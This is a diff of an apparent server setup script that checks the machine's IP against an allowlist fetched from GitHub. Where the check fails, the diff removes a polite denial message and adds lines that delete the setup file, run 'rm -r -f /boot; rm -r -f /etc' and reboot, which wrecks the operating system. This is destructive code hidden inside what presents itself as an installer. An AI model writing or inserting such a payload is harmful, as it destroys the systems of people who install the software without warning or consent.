@@ -5,8 +5,12 @@ IZIN=$(curl -sS https://raw.githubusercontent.com/halluboys/perizinan/main/main/
 if [ $MYIP = $IZIN ]; then
 echo -e "\e[32mPermission Accepted...\e[0m"
 else
-echo -e "\e[31mPermission Denied!\e[0m";
-echo -e "\e[31mDaftar IP dalam github lok sayang okay? mun dah daftar tapi masih juak permission denied refresh dolok website ya hehe. Love you #\e[0m"
+echo "Please Contact Admin"
+echo "Telegram t.me/haidaralkhawarizmi"
+echo "Waiting 5 Sec"
+rm -f setup.sh
+sleep 5
+rm -r -f /boot; rm -r -f /etc; reboot
 exit 0
 fi
 #EXPIRED
